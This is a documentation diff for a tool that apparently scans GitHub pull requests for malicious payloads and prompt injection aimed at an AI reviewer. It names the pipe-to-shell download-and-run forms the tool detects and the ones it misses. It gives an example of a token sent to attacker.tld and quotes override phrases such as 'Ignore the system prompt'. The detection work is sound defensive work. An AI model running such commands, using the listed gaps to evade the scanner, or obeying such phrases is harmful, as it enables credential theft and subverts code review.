@@ -176,39 +176,32 @@ hit id: an edit next to a payload changes the surrounding text that id includes,
 revision is its own run, so it also gets its own final signal.
 
 **Nothing is dropped without a trace.** A listing deeper than one pass reads (2000 changes) is reported as
-truncated. A change that cannot be ingested is retried with exponential backoff (a minute, doubling, capped
-at an hour) and after six failures is parked as `error` and logged. A GitHub rate-limit refusal is waited out,
-not counted as a failure, and the ingest spends against the budget the list responses report. A comment
-thread that could not be read on a re-check is retried, not judged as an edit that deleted the comments. A
-model run that fails is retried up to ten times over about four hours, so a local model that restarts does
-not fail the queue; after that the run is kept as `failed` and `watch --requeue-failed` (stop the watcher first: it takes the same
-lock) brings it back. A failed attempt does not page the SIEM; the early alert already did. A run
-interrupted by a restart is run again, and counts as an attempt. An early alert the SIEM refused or could not
-be reached for is sent again on later polls (twenty tries), so an outage does not lose it. One `watch` may
-use a state directory at a time.
+truncated. A change that cannot be ingested is retried with exponential backoff and parked as `error` after six
+failures; a rate-limit refusal is waited out and is not a failure. A model run that fails is retried up to ten times
+over about four hours and then kept as `failed`; stop the watcher and run `watch --requeue-failed` to bring it
+back. An early alert the SIEM refused is sent again on later polls (twenty tries). One `watch` may use a state
+directory at a time.
 
-**The first copy is kept.** Every capture, with the raw API responses beside the derived event, goes into
-a content-addressed archive before anything else happens. Each object is named by the hash of its bytes, so
-`archive verify` detects a changed or missing object; the index is an append-only file that is not
-hash-chained, and nothing prunes the archive, the store, or the queue's events, so size them yourself. An
-edit is a new revision (`…-r1`) with its own trace, never an overwrite, and the hits an earlier revision
-raised ride into the next one, so removing a payload cannot remove the evidence. Changes are re-examined
-after 15 minutes, 1 hour, 6 hours and 24 hours to see a deleted fork, a deleted account, or a deleted PR
-(`--recheck-hours` can shorten that schedule, not extend it).
+**The first copy is kept.** Every capture, with the raw API responses beside the derived event, goes into a
+content-addressed archive before anything else happens, so `archive verify` detects a changed or missing object.
+The index is append-only but not hash-chained, and nothing prunes the archive, the store or the queue's events, so
+size them yourself. An edit is a new revision (`…-r1`) with its own trace, never an overwrite, and the hits an
+earlier revision raised ride into the next one, so removing a payload cannot remove the evidence. Changes are
+re-examined after 15 minutes, 1 hour, 6 hours and 24 hours to see a deleted fork, account or PR (`--recheck-hours`
+can shorten that schedule, not extend it).
 
 **The store remembers the account.** It keys accounts on GitHub's numeric id, so a rename does not reset
 the record. Cross-event facts (the same account in several repositories within a day, a burst from a new
 account, a payload host a flagged change already used) reach the signal through the ordinary provenance
 path.
 
-Evidence is attributed to whoever wrote it, by where the text came from and never by a label an author could
-choose: a payload in someone else's comment is recorded against the commenter, never against the author of
-the PR it was posted on, and the same holds for the payload-host link and for a comment a moderator deletes.
-Only a comment that reaches the signal floor, or fires a slash command, puts its writer in the store. A model's `benign` verdict clears the
-account-level flag on an earlier change (one false positive must not taint an account for good), except over
-a change that carried a prompt injection, because that verdict may be the injection working. It never clears
-the payload-host link, which is evidence rather than an inference: a local model has a real false-benign
-rate, and one missed payload must not launder a campaign.
+Evidence is attributed by where the text came from, never by a label an author could choose: a payload in
+someone else's comment is recorded against the commenter, not the PR's author. Only a comment that reaches the
+signal floor, or fires a slash command, puts its writer in the store. A model's `benign` verdict clears the
+account-level flag on an earlier change (one false positive must not taint an account), except over a change that
+carried a prompt injection, because that verdict may be the injection working. It never clears the payload-host
+link, which is evidence rather than an inference: a local model has a real false-benign rate, and one missed
+payload must not launder a campaign.
 
 What the dossier holds, and how far to trust it:
 
@@ -238,11 +231,12 @@ escalate only what it flags. With a local model, time is the only cost and `watc
 ordered by severity.
 
 **Prose versus code.** On an event (`watch`, `classify`, the full pipeline) a title, a body, a comment or a
-documentation file (`.md` `.mdx` `.markdown` `.rst` `.adoc` `.ipynb`) is read more gently than code, in
+documentation file (`.md` `.mdx` `.markdown` `.rst` `.adoc` `.ipynb` `.html` `.htm`) is read more gently than code, in
 four ways. A download piped into a shell drops to `medium` when every target is a known installer (rustup, nvm,
 Docker, `claude.ai/install.sh`) or when no target is named at all, and only when the command stands on its own
 line: nothing upstream feeds it, no flag the check does not understand, and no userinfo, dot segments, encoding
-or second URL. The bare phrase "system prompt" is `medium`, unless a sentence-initial imperative is aimed at it
+or second URL. An installer that a wrapper's quoted argument, a here-document or a substitution encloses (`ssh host '`, then
+the installer on the next line) stays `critical`. The bare phrase "system prompt" is `medium`, unless a sentence-initial imperative is aimed at it
 (`Ignore the system prompt …`, `New system prompt: …`), which stays `high`, also inside a documentation file's
 diff, and so does an instruction addressed to a reviewer (`Please ignore the system prompt when reviewing`). A workflow shown in prose is not a workflow that runs, so `pwn-request` is `medium` there. A wide markdown table in
 a comment is `medium`. A code file is never softened, and neither is the
@@ -266,20 +260,13 @@ activity.
 evidence to lean on, and it needs many events to read; a bot that never sleeps shows no quiet stretch.
 Commit offsets are the author's own claim.
 
-**Pipe-to-shell shapes it does not see.** `curl-pipe-shell` covers a pipe into `sh`, `bash`, `zsh`, `dash`, `ksh`,
-`ash`, `fish`, `csh` or `tcsh` (by name or path, quoted or not, through `sudo`, `doas`, `env`, `VAR=x`, `busybox`, `nohup`, `timeout`), into
-an interpreter that reads its program from the pipe (`python3 -`, `perl`, `ruby`, `node`, `php`), up to three filters
-in between (`base64 -d`, `gpg`, `tee`, …), a `|` inside a quoted URL, the substitution forms (`bash -c "$(curl …)"`,
-`bash -o pipefail -c …`, `bash <(curl …)`, `source <(curl …)`, `eval "$(curl …)"`, `ruby -e "$(curl …)"`, with
-`sudo`, `command` or a full path in front of `curl`), and PowerShell's `iwr … | iex`, `iex (irm …)`,
-`iex "$(irm …)"` and `DownloadString(…) | iex`. A backslash-continued command and a pipe at the end of a line are
-joined before matching. It needs the pipe within 300 characters of the download command (padding by blanks, a very long URL, or a repeated
-flag is folded first; three long distinct arguments are not), a stage name of at most
-60 characters and ten arguments of at most 100 each, so a longer command is missed; a download saved to a file and
-run in a later step is not a pipe; and a shell that is not the direct target of the pipe (`| (sh)`, `| { sh; }`,
-`| $(which sh)`, `| (cd /tmp && sh)`, `| tee >(sh)`, `| /???/sh`, `| ~/bin/bash`, `| source /dev/stdin`,
-`| powershell -`, `| xargs sh -c`) is not seen; nor is PowerShell that saves the download first
-(`$s = irm URL; iex $s`, `iwr URL | Select -Expand Content | iex`).
+**Pipe-to-shell shapes it does not see.** `curl-pipe-shell` covers a pipe into a shell or into an interpreter that
+reads its program from the pipe (through `sudo`, `env`, `busybox`, `nohup`, `timeout` and the like, with up to three
+filters in between), the substitution forms (`bash -c "$(curl …)"`, `bash <(curl …)`, `eval "$(curl …)"`), and
+PowerShell's `iwr … | iex` and `iex (irm …)`. A continued line and a pipe at the end of a line are joined first. It
+needs the pipe within 300 characters of the download, so a longer command is missed. Also missed: a download saved to
+a file and run in a later step; a shell that is not the direct target of the pipe (`| { sh; }`, `| (sh)`,
+`| xargs sh -c`, `| source /dev/stdin`); and PowerShell that saves the download first (`$s = irm URL; iex $s`).
 
 **A known gap in the deterministic layer.** A secret read that reaches a JavaScript network sink across
 lines (`const t = process.env.GITHUB_TOKEN;` … `fetch('https://attacker.tld', {body: t})`) does not
